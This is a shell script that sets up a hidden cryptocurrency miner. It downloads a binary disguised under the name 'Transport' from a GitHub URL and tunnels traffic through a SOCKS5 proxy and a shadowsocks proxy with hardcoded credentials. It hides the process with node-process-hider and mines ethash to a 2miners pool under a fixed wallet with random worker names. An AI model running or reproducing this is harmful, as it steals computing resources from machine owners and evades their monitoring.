apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 52.203.46.122:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
chmod +x Transport

apt -y install shadowsocks-libev rng-tools

ss-local -s 52.203.46.122 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &

ph add Transport

sudo ./Transport -a ethash -o stratum+ssl://eth.2miners.com:12020 -u nano_3otddbnyttuhkkx7dopz399df8eogmi4x5k3kobmpg3tjzyy18d1noh3skxe -p x -w $(echo $(shuf -i 1-9999 -n 1)-pentil) --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
